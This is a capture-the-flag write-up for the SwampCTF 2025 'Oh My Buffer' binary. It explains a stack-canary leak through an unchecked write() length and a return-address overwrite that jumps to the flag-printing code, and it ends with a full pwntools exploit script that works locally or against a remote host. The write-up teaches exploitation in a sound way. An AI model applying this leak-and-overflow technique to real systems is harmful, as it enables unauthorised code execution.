---
title: "Oh My Buffer 🤯 – Canary Leak + Ret2Win (SwampCTF 2025)"
tags: [CTF, binary exploitation, stack canary, ret2win, pwn]
---

# Oh My Buffer 🤯

![pwntools](https://img.shields.io/badge/pwntools-✔️-brightgreen)
![Difficulty](https://img.shields.io/badge/difficulty-Easy-blue)
![Category](https://img.shields.io/badge/category-Pwn-orange)
![CTF](https://img.shields.io/badge/Event-SwampCTF%202025-purple)

> I may have messed up my I/O calls, but it doesn't matter if everything sensitive has been erased, right?

Stack overflow? Canary? Password prompt?
 
We’re not logging in — we’re logging out with the flag. 🏃💨

## 📚 Table of Contents

- [Initial Inspection 🕵️](#initial-inspection-)
- [Goal & Constraints 🎯](#goal--constraints-)
- [Canary Leak 🕳️🐦](#canary-leak-)
- [Ret2Win 💥](#ret2win-)
- [Exploit 🔨](#exploit-)
- [Conclusion 🧠](#conclusion-)

## Initial Inspection 🕵️

Standard binary setup:

![Checksec result](https://github.com/user-attachments/assets/3ddae3cb-eb7c-4ad7-893d-22215fbb51a5)

- RELRO: Partial
- Stack Canary: ✅
- NX: ✅
- PIE: ❌

There’s a stack canary in place — so we can’t just overflow directly… yet.

The binary presents a menu:

![Binary menu](https://github.com/user-attachments/assets/324fb28e-d534-407e-8297-852083635c9d)

### Disassembly reveals:

**Main:**

![Main Ghidra](https://github.com/user-attachments/assets/70e48067-a755-4da2-bd2f-7def5a8bb3b9)

→ **Flag read & hidden via redirection:**
- The flag is loaded into memory (`local_58`) early on.
- `stdout` is redirected to `/dev/null` before printing the flag.
- After printing, `stdout` is restored — but it's too late, the flag was already discarded.

→ **Fork behavior:**
- A `fork()` occurs after this logic, and **the user only interacts with the `child process`**.
- If we redirect control flow after the `dup2(local_70, 1)` call and trigger `fputs(local_58, stdout)`, the flag will be printed.

**Register:**

![Register Ghidra](https://github.com/user-attachments/assets/4f7e9fb8-c346-4b31-bd51-2ee6d467bd6d)

-> **Overflow possible**: 
- `Local_28` have a size of `24`, but the read can take `0x2a` = `42` bytes.

**Login:**

![Login Ghidra](https://github.com/user-attachments/assets/96929eb9-a940-4a62-9279-4639f4c13881)

-> **Stack information leak**: 
- The program reads an integer (`local_2c`) from the user and uses it as the length parameter for `write()`.  
- It writes `local_2c bytes` starting from a buffer (`local_28`) that holds only `24` bytes.
- This allows the user to **leak data past the buffer**, including stack values like.. **The canary**!

## Goal & Constraints 🎯

-> **We want to**:
- Leak the **stack canary**
- Bypass the check
- Return to the function that prints the flag.

**Control Flow Hijack 📍**

I chose to return to this instruction in `main()`:

`iVar1 = fileno(local_60);` // Address: `0x401453`

✅ Why?
- The flag is already loaded into `local_58` earlier in `main()` before the program `forks`.
- By jumping here, we **skip the `stdout` redirection to `/dev/null`** and directly reach: `fputs(local_58, stdout)`;
- Since the original **`stdout` is still active**, this cleanly prints the flag to the screen.

This avoids having to redo the file loading and simply leverages the already-populated stack frame of `main()`.

-> **To recap**:
- `register()` is vulnerable: we control how many bytes we write
- `login()` leads to a leak, but only if we supply the right input
- In the `main()` function, if we override RIP with the right address `0x401453` (NO PIE), we can print the flag

Simple ret2win, but protected by a canary.

## Canary Leak 🕳️🐦

How to leak the canary?

The `login()` option:

```
write(1,"How long is your username: ",0x1b)
```

We can ask for a large input and then *read it back* with:

```
read(0,local_28,0x10);
write(1,"Sorry, we couldn\'t find the user: ",0x22);
write(1,local_28,(long)local_2c);
```

That gives us a memory leak! If we send enough bytes, we can recover the 7 visible bytes of the 8-byte canary. The MSB is always `\x00`.

![Leak example](https://github.com/user-attachments/assets/23a08b0a-2c21-4854-85c4-24eba2199cbd)

## Ret2Win 💥

Now that we have the canary, we can overflow in the `register()` function.

-> **With the full 8-byte canary**:
- Fill buffer (24 bytes)
- Append canary
- Fill saved RBP (8 bytes)
- Overwrite RIP with `0x401453`

Boom — flag printed!

## Exploit 🔨

Here's the full exploit:

```python
from pwn import *
import argparse
import sys

# Constants
BUFFER_OFFSET = 24
CANARY_SIZE = 8
RBP_SIZE = 8
FLAG_PRINT_ADDR = 0x401453  # Code that prints the flag in main()

def get_canary(io):
    """
    Leak the stack canary via the login option.
    """
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"How long is your username: ", b"60")
    io.sendafter(b"Username: ", b"A" * 16)
    io.recvuntil(b"A" * 16)
    leak = io.recv(60)
    canary = b'\x00' + leak[9:16]
    print(f"[+] Leaked canary: {canary.hex()}")
    return canary

def build_payload(canary):
    """
    Build the exploit payload.
    """
    payload  = b"A" * BUFFER_OFFSET
    payload += canary
    payload += b"B" * RBP_SIZE
    payload += p64(FLAG_PRINT_ADDR)
    return payload

def run_local(path):
    """
    Launch local binary process.
    """
    print(f"[*] Running locally: {path}")
    elf = ELF(path)
    context.binary = elf
    io = process(path)
    return io

def run_remote(host, port):
    """
    Connect to remote service.
    """
    print(f"[*] Connecting to {host}:{port}")
    return remote(host, port)

def main():
    parser = argparse.ArgumentParser(description="SWAMP CTF exploit runner")
    subparsers = parser.add_subparsers(dest="mode", required=True)

    # --local ./binary
    local_parser = subparsers.add_parser("local", help="Run exploit locally")
    local_parser.add_argument("binary", type=str, help="Path to local binary")

    # --remote
    remote_parser = subparsers.add_parser("remote", help="Run exploit remotely")
    remote_parser.add_argument("ip", type=str, help="Remote IP or hostname")
    remote_parser.add_argument("port", type=int, help="Remote port")

    args = parser.parse_args()

    # Setup target
    if args.mode == "local":
        io = run_local(args.binary)
    elif args.mode == "remote":
        io = run_remote(args.ip, args.port)
    else:
        print("[-] Unknown mode")
        sys.exit(1)

    # Exploit steps
    canary = get_canary(io)
    io.sendlineafter(b"> ", b"1")
    payload = build_payload(canary)
    io.sendafter(b"Username: ", payload)
    io.sendafter(b"Password: ", b"pwnd\n")

    # Grab the flag
    io.recvline()
    flag = io.recvline().strip()

    if b"swamp" in flag.lower():
        print("[+] FLAG:", flag.decode(errors="ignore"))
    else:
        print("[-] No flag found.")
        print(flag.decode(errors="ignore"))

    io.close()

if __name__ == "__main__":
    main()
```

![Flag displayed](https://github.com/user-attachments/assets/9bbdbb63-6daa-4921-9dca-8196ea0c9497)

`[+] FLAG: swampCTF{fUn_w1tH_f0rk5_aN6_fd5}`

## Conclusion 🧠

A great warm-up binary that teaches you:

- How to **leak a canary** with a format string or echoed input
- How to **ret2win** with precise stack control
- Why off-by-one leaks are often all you need

🔙 [Back to SwampCTF 2025 Writeups](../../)
